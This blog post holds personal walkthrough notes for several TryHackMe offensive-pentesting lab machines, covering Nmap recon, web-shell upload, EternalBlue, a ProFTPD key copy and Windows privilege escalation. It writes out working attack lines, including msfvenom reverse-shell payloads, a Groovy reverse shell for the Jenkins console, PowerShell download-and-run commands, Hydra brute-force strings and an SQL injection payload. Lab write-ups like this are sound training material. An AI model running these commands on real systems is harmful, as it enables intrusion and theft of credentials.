---
layout: post
title: 6.Offensive Pentesting
subtitle: Notes of the TryHackMe's path Offensive Pentesting.
tags: [thm]
---
## 0. Índice.

- 1 Getting Started.
- Vulnsversity.
- Blue.
- Kenobi.

- 2 Advanced Explotation.
- Steel Mountain.
- Alfred.
- HackPark.
- Game Zone.
- Skynet
- Daily Bugle
- Overpass 2 - Hacked.
- Relevant.
- Internal.

- 3 Buffer Overflow Explotation.
- Buffer Overflow Prep.
- Brainstorm.

<br />

### 1. Getting Started.
#### 1.1. Vulnversity.

We're going to compromise a target machine with IP: 10.10.39.39.

First of all, we have to a reconaissance job with Nmap tool. Thus, we trigger a shell and enter the following command:

```bash
nmap -T5 -p- -A <VictimIP>
```

With this command we espect to obtain a detailed information (-A) about all the open ports (-p-) on the machine at high speed (-T5).

Atending to the results of the scanning we can see among other things that that the server is running a web server on port 3333, that is a Linux (most likely Ubuntu) server and it have SMB servers on port 139 and 445 with a SSH port open:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007082112.png' | relative_url }}" text-align="center"/>
</div>

Thus, we are going to explore the web application in order to find something useful. In this case we are going to user *dirb* tool and the wordlist *common.txt*. Dirb is a web directory scanning tool that will provide us with a map of the web directories and sub directories that itfounds in base of a wordlists. We launch the following command:

```bash
dirb http://10.10.39.39:3333
```

And we receibe the subsecuently result:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007083459.png' | relative_url }}" text-align="center"/>
</div>

As we can see, the web app have a "upload" functionality section in *internal*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007084313.png' | relative_url }}" text-align="center"/>
</div>

So we can try to upload a webshell to gain RCE over the server and then perform a privilege escalation to gain full control over the machine.

In first place, we need to know in which language is the web server based (PHP, Python, Java, etc), there is not a standard way to obtain this information, and since there isn't any clue on the web app, we will have to test differents extensions.

Multiples php scripts of webshell in this [link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
We have to configure the IP and port parameters and start a listener in out machine in that port.

In our first atempt to upload a php shell we get a block message:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007091354.png' | relative_url }}" text-align="center"/>
</div>

So we already know which program language we need to use, we only least to find a way to upload a php script in order to execute it. It happens there is more extensions that a php script would admit in order to be execute (.php, .php2, ..., .phtml).

To discover which extension is valid, we catch a tool like burpsuite and capture the upload "shell.php" request to send it to the burp intruder:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007093155.png' | relative_url }}" text-align="center"/>
</div>

We can see that the name of the file is already on the request and it can be modified to try to sneak the file with another extensión. We use the burp Intruder to send in batery a set of requests with te extension changed, then we configure the lists of extensions to be used

```default
php2
php3
php4
php5
phtml
```

and the block message to discart the responses that have been blocked

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007093653.png' | relative_url }}" text-align="center"/>
</div>

So we launch the attack and the results give that the .phtml extension is the correct:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007094115.png' | relative_url }}" text-align="center"/>
</div>

Thus, we go to "internals/uploads" and there we would find our script. Only least to click on it to execute it and active a shell in our previous set up listener:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007094507.png' | relative_url }}" text-align="center"/>
</div>

We lookup SUID files with the following command:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \
```

And we get:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007102222.png' | relative_url }}" text-align="center"/>
</div>

To exploit that systemctl SUID file we go to GTFOBins and look for systemctl

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007102309.png' | relative_url }}" text-align="center"/>
</div>

We copy that code into a script changing the command to "cat /root/root.txt" to obtain the flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007102538.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.2. Blue.

In this case we are going to attack a Windows machine. In first case, we do a port scanning with Nmap using the following command:

```bash
nmap -T5 -p- -A <IP>
```

This command will use the Nmap tool to perfom a high speed scan (-T5) over all the ports (-p-) and then will display detailed information about the open ports founded.

The results show that there is several ports open, among them we found; SMB Servers, RDP, and multiple RPC ports:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007114601.png' | relative_url }}" text-align="center"/>
</div>

Furthermore, the command will run some nse scripts, there we can check that the SMB servers are running in a Windows 7 OS host among other things. So, we can try to test if the SMB server is vulnerable to the famous malware Eternalblue with the following command:

```bash
map -T5 -p445 --script smb-vuln-ms17-010 <IP>
```

Thus, the results indicate that the SMB server running on port 445 is in fact vulnerable to EternalBlue:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007115313.png' | relative_url }}" text-align="center"/>
</div>

Then, we open our C2 enviroment tool Metasploit and search the term "Eternalblue", write up the missin parameters as RHOSTS and others and launch the exploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007120252.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007120308.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007120320.png' | relative_url }}" text-align="center"/>
</div>

Then, in order to perform a privilege escalation operation we execute de term 'getsystem':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007120641.png' | relative_url }}" text-align="center"/>
</div>

If the system don't allow us to elevate privilege we can try to migrate the process to some other process runned by NT AUTHORITY\\SYSTEM with the help of 'ps' and 'migrate \<PID>' commands. Like this we already gain full control over the machine.

<br />

#### 1.3. Kenobi.

In this case we stand against a Linux machine. We proceed to scan all the ports with Nmap tool:

```bash
Nmap -T5 -p- -A <IP>
```

The results shown different things, the machine have a FTP, SSH, HTTP and both SMB servers listening in they default ports. Particulary interesting too is that the port 111 have arpcbind server that bind rpc defined by a number with other programs like nfs, mountd, etc.

- The web app seems to be useless.

- This esentially mean that, among other things, port 111 is binding us with a nfs server, this is, a network file system.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007123851.png' | relative_url }}" text-align="center"/>
</div>

It may be worth to dive in to port 111, so we can use the "showmount" binary to see the directory mount on the NFS server or we use the following scripts:

```bash
nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.172.208
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007131247.png' | relative_url }}" text-align="center"/>
</div>

The results shows us that the directory mounted ass entry point is /var.

<br />

- The scripts runned by default by -A flag shown some useful details about the machine, like that there is account named Kenobi:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007124026.png' | relative_url }}" text-align="center"/>
</div>

we are going to do a SMB or Samba enumeration with nse scripts:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

The script display that apparently there is a smb share named "anonymous" so in order to take a look on it we are goin to user the smbclient with the 'guest' user that no needs any password:

```bash
smbclient //10.10.172.208/anonymous -U guest
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007125342.png' | relative_url }}" text-align="center"/>
</div>

In the share we found a file; "log.txt" that have indeed information from a SSH key of Kenobi user:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007125652.png' | relative_url }}" text-align="center"/>
</div>

And information about a ProFTPD server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007125829.png' | relative_url }}" text-align="center"/>
</div>

<br />

- Finally, we are going to gain access to the FTP server through a exploit. First, we connect to the FTP server with Netcat:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007131649.png' | relative_url }}" text-align="center"/>
</div>

And we find that the version of the server is 1.3.5. A simple look up in google will lead us to a documented [missconfiguration](http://www.proftpd.org/docs/contrib/mod_copy.html) that allow to an unautenticated user to move files between directories of the system.

Thus, we read the documentation of the commands and we log again into the server and move the ssh public key mentioned before of the kenobi user to the /var directory in order to put it in a range of our reach.

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007182421.png' | relative_url }}" text-align="center"/>
</div>

Then, we mount the /var/tmp directory to our machine:

```bash
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007182717.png' | relative_url }}" text-align="center"/>
</div>

And copy the rsa file into our .ssh directory and log into the machine as kenobi:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007182926.png' | relative_url }}" text-align="center"/>
</div>

Then, only remains the escalation privileges phase. For this, we are going to use the SUID files in combination with modification of the PATH enviroment variable.

- In first place there is a binary called menu, propierty of root and with the SUID bit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007185717.png' | relative_url }}" text-align="center"/>
</div>

This displays a menu that allow to a user to execute certains options (among them are OS commands), like *ifconfig*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007185823.png' | relative_url }}" text-align="center"/>
</div>

- So we can try to generate a binarie and call it "ifconfig":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007185937.png' | relative_url }}" text-align="center"/>
</div>

Then, we change the PATH variable to include our home directory first

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007190208.png' | relative_url }}" text-align="center"/>
</div>

And finaly, we give to the file execution perms and execute it through the SUID binary:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221007190313.png' | relative_url }}" text-align="center"/>
</div>


### 2. Advanced Explotation.
#### 2.1. Steel Mountain.

First, we execute a detailed Nmap port scanning of all ports of the machine:

```bash
Nmap -T5 -p- -A <IP>
```

Detailed display (-A), high spped (-T5) and all ports (-p-). The results shown a web application in port 80, due SMB servers in ports 139 and 445, a RDP server in 3389. So far, everithing is expectable but the ports 5985, 8080 & 47001 offer HTTP service with HTTP File Server and Microsoft HTTPAPI servers:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008154640.png' | relative_url }}" text-align="center"/>
</div>

Exploring the various network services the machine offers we got that the server of the HTTPFileServer is a Rejjeto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008154947.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008155003.png' | relative_url }}" text-align="center"/>
</div>

Thus, we proceed to investigate if exist an exploit to gain access over the machine through this server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008155352.png' | relative_url }}" text-align="center"/>
</div>

Searching it in metasploit we found a module:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008155501.png' | relative_url }}" text-align="center"/>
</div>

Then, we set up the RHOSTS and RPORT parameter and launch the exploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008160443.png' | relative_url }}" text-align="center"/>
</div>

In order to perfom an enumeration of the machine we are going to use the [Powerup.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) module to import some commands that would be useful to get sensible information about the system. For achieve this purpouse is a built-in meterpreter command called 'upload':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008161428.png' | relative_url }}" text-align="center"/>
</div>

And then, after load powershell in meterpreter with "load powershell", in a powershell session Import the module and run the Invoke-AllChecks:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008162113.png' | relative_url }}" text-align="center"/>
</div>

We observer that, among all the content that the cmdlet displays, there is a service that appears to have an unquoted executable path vulnerability (and its initiated by LocalSystem which would grant us more privileges and anybody can restart it):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008162444.png' | relative_url }}" text-align="center"/>
</div>

This consist in a use of the behaviour of autocomplete windows-path feature. If the path isn't correctly couted Windows understand that the spaces mark parameters of the file to be executed, thus, Windows asume that executable is C:\\Programs and the rest are parameters, if the system doesn't found any executable matching the name, then will complete the path C:\\Program Files(x86)\\IObit\\Advanced.

Thus, if we have writable permissions on the IObit directory we could generate a malware and call it Advanced.exe on the IObit directory making that Windows math our malware with the executable that the services requiere to start. The all we need is to restart correctly the service to make the system run our malware.

First, we make a malicious payload for windows services with MsfVenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.207.230 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

This command employs the msfvenom utility to make a shell_reverse_tcp for windows with architecture of x86 and format of service executable:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008170314.png' | relative_url }}" text-align="center"/>
</div>

And then we upload it to the correct directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008170348.png' | relative_url }}" text-align="center"/>
</div>

Finally, we make a listener in our attack machine and restart the service:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008170557.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221008170616.png' | relative_url }}" text-align="center"/>
</div>

And we have gain full control over the machine.

<br />

We could do this without a meterpreter shell using manual powershell commands. The procedure is the same but it will be useful the following commands:

- *Invoke-WebRequest* to download files to the victim machine:

```powershell
Invoke-WebRequest -Uri <source> -OutFile <destination>
```

- *Get-Acl*, to see writeable permissions of a folder:

```powershell
(Get-Acl -Path "C:\Program Files (x86)\IObit").Access
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.233.14:8000/shell.exe','shell.exe')"
- *Restart-Service* to restart the service with the unquoted path:

```powershell
Restart-Service AdvancedSystemCareService9
```

<br />

#### 2.2. Alfred (Hydra, Jekins & Token Impersonation).

In this case we are going to face a Windows machine. A por scanning with Nmap

```bash
nmap -T5 -p- <IP>
```

shown us that the machine have two http listening ports offering two web app services through two different web servers:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010094702.png' | relative_url }}" text-align="center"/>
</div>

Researching both web apps we found on which run on port 8080 a login portal:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010095016.png' | relative_url }}" text-align="center"/>
</div>

By the way, mapping the website seems to be useless. So we try to perfom a brute-force attack on the login page with Hydra. First based on some Osint job over the web pages and the web server we made a file with passwords candidates:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010100115.png' | relative_url }}" text-align="center"/>
</div>

And we use it in the following command:

```bash
hydra -L list.txt -P list.txt 10.10.179.245 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=Submit=Sign+in:Invalid username or password" -v
```

This command is built following the next stages:

- First, we employ the hydra comand and we pass him the list of usernames and passwords to be used with the -L and -P flags. For both we are using the same list.
- Then we pass the IP and, because the web app is offered through a not standard port we add the -s flag to define the port to be used to send the requests.
- Next we define the protocol in which we wanna send the request. Since we are using HTTP we have to select if the method is GET or POST, this can be found in the Inspector > Network and send a login request:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010102533.png' | relative_url }}" text-align="center"/>
</div>

As we see, we must use the POST form so we write 'http-post-form' and add between coutes: the login page, the post data, and the error message that the pages displays to indicate an error login try.

- The login page can be found by the same way as the we found about the POST method on the "file" field:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010103002.png' | relative_url }}" text-align="center"/>
</div>

- The data can be found clickn on the login request on Inspector Network and on the right a window will appears will multiple tabs, on the tab "Params" we can found the parameters that the client request send as data,

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010103256.png' | relative_url }}" text-align="center"/>
</div>

we have to add it to the command separate with '&' and on the username parameter we write the value ^USER^ and on the password ^PASS^

And at last, the error message that can be found sending an error login try:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010103525.png' | relative_url }}" text-align="center"/>
</div>

This will serve to Hydra as a match parameter to catalogate a response as fail. If we don't localizate correctly this message or we don't write it correctly Hydra will not find it on any request and in consecuence will mark all the request as valid credentials.

When executing the command we obtain:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010104000.png' | relative_url }}" text-align="center"/>
</div>

So admin:admin are a valid credentials.

No we are in the web app as admins. On the [documentation](https://www.jenkins.io/doc/book/managing/script-console/) of Jenkins appears that exists a feature that allows the execution of Groovy scripts. If this feature doesn't receive adequate security some intruder could execute malicious script.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010165821.png' | relative_url }}" text-align="center"/>
</div>

Thus, we go to *Manage Jenkis > Script Console* (or simply to the web file /script) and run the following groovy script after we put a netcat listener in our machine:

```groovy
String host="<LocalIP>";
int port=<LocalPort>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010165546.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010165556.png' | relative_url }}" text-align="center"/>
</div>

And we have gained access to the machine. Now, we are going to switch to a meterpreter shell through the C2 enviroment of Metasploit following the steps below.

- First we start the Msfconsole to start a multihandler:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010171744.png' | relative_url }}" text-align="center"/>
</div>

- Next, we use Msfvenom to create a payload with meterpreter for windows and intiate a python server to download with the victim machine the malicious script:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe; python3 -m http.server
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010172039.png' | relative_url }}" text-align="center"/>
</div>

And then, we download it with the cmd comand:

```cmd
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.90.103:8000/shell.exe','shell.exe')"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010172408.png' | relative_url }}" text-align="center"/>
</div>

- At last, we initiate the process with powershell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010172737.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010172748.png' | relative_url }}" text-align="center"/>
</div>

Now, we only have to escalate privilege. We are doing this through *Impersionation_token* technique. Windows OS employes token to regulate privileges and actions among users. Nevertheless, there are some privileges relationed with the manipulation of the tokens, Windows allows the impersonation because sometimes is necesary to do something in the behalf of other user (like init a service or something of the kind).

If we load a powershell shell and execute the *whoami /priv* cmdlet we will see the *SeImpersonatePrivilege* enable:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010180109.png' | relative_url }}" text-align="center"/>
</div>

Then, we proceed to see which tokens are avialable with the cmdlet:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010180402.png' | relative_url }}" text-align="center"/>
</div>

The BUILTIN\\Administrator token is avaliable so we can run the cmdlet: *impersonate_token "BUILTIN\\Administrator"*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010180653.png' | relative_url }}" text-align="center"/>
</div>

To ensure that we indeed gained privileged user, we are going to migrate to a process that is runned by AUTHORITY\\SYSTEM, with *ps* we locate an adecuate process:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010180910.png' | relative_url }}" text-align="center"/>
</div>

And with *migrate* we in fact migrate to that process:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010181048.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.3. HackPark (Hydra, Web access Blogengine, winPEASS, Hijacking).

In this case we are facing a Windows OS. In a port scanning we can see that it have available a HTTP, RDP, WinRM servers on default ports:

```bash
nmap -T5 -sV -p- <IP>
```

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010184433.png' | relative_url }}" text-align="center"/>
</div>

At first, the port 5985 appears to be a web server but a more detailing port scanning over that port reveals that is indeed a WinRM server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010184440.png' | relative_url }}" text-align="center"/>
</div>

So we proceed to investigate the web page and we find that the page have a comment of *Visitor1*, is a tribute to the clown *Penywise* and thta have a login section:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010184706.png' | relative_url }}" text-align="center"/>
</div>

The credentials by default of blogengine.net (admin:Passw@rd123) doesn't work, thus is a personalizated user. We are going to use a personalizate list of users:

```default
Admin
admin
penywise
Penywise
user
User
Visitor1
```

An we use this list in the following command:

```bash
hydra -L /root/list.txt -P /usr/share/wordlists/rockyou.txt 10.10.128.134 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=nYpNLTHl95RuU%2BKXvciUT84uGaVvolqEnuw1Ts%2F8AX6IpGI4dlV%2BQY5Hhac3%2FRDvXeUVpELH90g4gPMKngsgCG6NaSDIsEWZOnhd9%2B37MJwQDSkDUVenDUj3QEoOZGJsOp47f0DiBvcSxmBVJlRUNVrmYIBIwlXPqGFvNFffah9FkTfj6FFncz6Aw2oRXzPx2iPOX0YFTCW3Sw0itLGZFkoXoIbKK%2BmZ5k%2BLhmxqloj6Det8Nfa7ZBuulX6Ukxwc3%2FyBpfRaopkvFzfyonu28sWMpv8Sg%2BwsFLeEOBh7XYLhcw4pk0Pv7GpFXbVLilfQhTVUb0Yk5eJy9HXqrhoZ2oghKGdiKFhBS2ynDt0E%2BJKTjNJ%2F&__EVENTVALIDATION=HITidSBLCMzLDxHqA6sSqgn8YHNMwAI%2B4C25XFeNg%2Bce7maOnXO36yE%2BNMUJTfzKopHG1A2q819p7LpXLJ1u%2BZYm0hWhlH35Gykgut6sw%2BJ%2FSQ2yX%2BpjXyhFiOPmiyWVOiGR%2B0sep%2Fp3h%2B6dvowJ5noK0JXpUB8jh6%2FuZ4c97LN3vKH7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

The process of the built of the command above is described in the Alfred machine. And then we have this result:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010190901.png' | relative_url }}" text-align="center"/>
</div>

And ike this we can login to the machine as admins with the credentials "admin:1qaz2wsx". Then, we inspect the web as admin and found the file /admin/about.cshtml in which appears a brief description of the webserver:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010192736.png' | relative_url }}" text-align="center"/>
</div>

This information could lead to an [exploit](https://www.exploit-db.com/exploits/46353) which will give us initial access over the machine. We found this an use it. We save the file, open it and change the local IP to match ours:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010193740.png' | relative_url }}" text-align="center"/>
</div>

Following the instructions

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010201219.png' | relative_url }}" text-align="center"/>
</div>

we find that we have to start a listener in our machine that have to be compatible with the parameter that we have modify above and upload the exploit through the "file manager" as PostView.ascx in the web server.

On the Dashboard we go through Post and click on one of them:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010201732.png' | relative_url }}" text-align="center"/>
</div>

And then we click over the File manager

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010201756.png' | relative_url }}" text-align="center"/>
</div>

And upload the file and next click over the just-added icon to incorporate the code to the file:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010202130.png' | relative_url }}" text-align="center"/>
</div>

Next step is found the uploaded file in the following path:

\http://10.10.128.134/?theme=../../App_Data/files/

This is because we are using in fact a Directory Traversal Vulnerabilty since the file is stored in the "App_Data/files" directory, outside the root directory of the web server.

Thus, we go to that direction and trigger the exploit gain initial access.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221010203246.png' | relative_url }}" text-align="center"/>
</div>

Now we have just gained RCE over the server but our shell through netcat is unestable so we're going to change shell downloading a payload to obtain a shell handled with the C2 enviroment Metasploit.

First, we create a meterpreter reverse shell for windows with the following command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.90.103 LPORT=4444 -f exe > shell.exe
```

Then we start the Metasploit enviroment, use a multi/handler and set the parameters PAYLOAD, LHOST, LPORT to match with the set in our payload and run the handler.

Next we initiate a http server with python and use the following powershell command (runned on the cmd) to download on the victim machine the malicious binarie:

```cmd
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.34.76:8000/shell.exe','shell.exe')"
```

Then, run the following powershell command to execute the binarie:

```cmd
powershell "Start-Process shell.exe"
```

And we have gained a meterpreter shell in the victim machine:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011090052.png' | relative_url }}" text-align="center"/>
</div>

Then, in order to do enumeration job we are going to use the enumeration oriented script [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). We have first to upload the binarie (from the binarie folder) and execute it:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011104000.png' | relative_url }}" text-align="center"/>
</div>

WinPEAS offer us some important details like the existance of a folder holding the dependencies of a service (SystemScheduler) that is worldwritable:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011104124.png' | relative_url }}" text-align="center"/>
</div>

Thus, we can perfom a Service Windows Privilege escalation attack. If we go to the C:\\Program Files x(86)\\SystemScheduler folder and open the logs we can see that the Administrator start the Message.exe binary often in time:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011124132.png' | relative_url }}" text-align="center"/>
</div>

So we can substitute the Message.exe with a malicious binary created with MSFVenom:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011124250.png' | relative_url }}" text-align="center"/>
</div>

And exit the meterpreter session and open other to handle the conection triggered by the new binary from the Administrator account:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011124337.png' | relative_url }}" text-align="center"/>
</div>

Remember that we can store the session with Ctrl+Z instead of kill the session with Ctrl+C this allow us to return in the future if we need it.

<br />

#### 2.4. Game Zone(SQL Injection, Hash-identifier, JohnTheRipper, SSH Tunneling, Metasploit)

In this case we are facing a Linux server that, according pour port scanning with nmap (nmap -T5 -p- -A), have SSH and HTTP servers listening on default ports:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011145944.png' | relative_url }}" text-align="center"/>
</div>

We access to the web page and see that it have a login fields and a search bar that could be vulnerable to SQL-injection:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011150215.png' | relative_url }}" text-align="center"/>
</div>

Once we tried over the username field a SQL Query payload (' or 1=1 -- -) we are redirected to /portal.php file that allo us to search for a game:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011151012.png' | relative_url }}" text-align="center"/>
</div>

This could be vulnerable to SQL injection so to ensure this posibility we are going to use the tool SQLmap. The easiest way to doing this, since the method is a HTTP-POST parameter is within the body of the POST request, is to use an auxiliary tool like BurpSuite to catch the request and save its contents into a file (file.txt) and employ it in the next command:

```bash
sqlmap -u "http://<IP>" -r file.txt <Instruction>
```

Generally, the data is stored in a DBMS (Data Base Management System) that holds multiple databases that at the same time hosts various tables conform of columns and rows.

Thus, the first instruction for Sqlmap is to display the avaliable databases on the DBMS with the instruction: *--dbs*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011153958.png' | relative_url }}" text-align="center"/>
</div>

Then, the *db* is suggestive, to dump the tables on this database we use the instruction: *-D db --tables*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011154105.png' | relative_url }}" text-align="center"/>
</div>

And to open the contents of the table users we use: *-D de -T users --dump*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011154207.png' | relative_url }}" text-align="center"/>
</div>

Then we have obtained a user and a hash, we're going to crack this hash with JohnTheRipper.

First, we use, hash-identifier to identifie the type of hasht to make easier the job to John:

```bash
hash-identifier <<< ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011154908.png' | relative_url }}" text-align="center"/>
</div>

So SHA-256 is a possible hash, then we use this information in the command below:

```bash
john --format=RAW-SHA256 -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

This command try to crack the hash that is in the hash.txt file through the SHA-256 algorithm using the rockyou.txt list, obtaining:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011155222.png' | relative_url }}" text-align="center"/>
</div>

So we have credentials to access the machine through the SSH server; agent47:videogamer124

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221011155339.png' | relative_url }}" text-align="center"/>
</div>

Now, in order to perfom local enumeration about the machine, we going to use [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

